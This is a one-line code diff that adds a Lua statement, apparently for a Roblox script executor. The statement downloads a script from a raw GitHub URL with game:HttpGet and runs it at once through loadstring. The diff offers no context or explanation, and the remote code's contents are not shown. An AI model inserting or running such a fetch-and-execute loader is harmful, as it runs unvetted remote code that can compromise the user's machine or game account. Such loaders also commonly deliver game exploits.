@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet(("https://raw.githubusercontent.com/TurboOnly/kek/main/Debug"),true))()
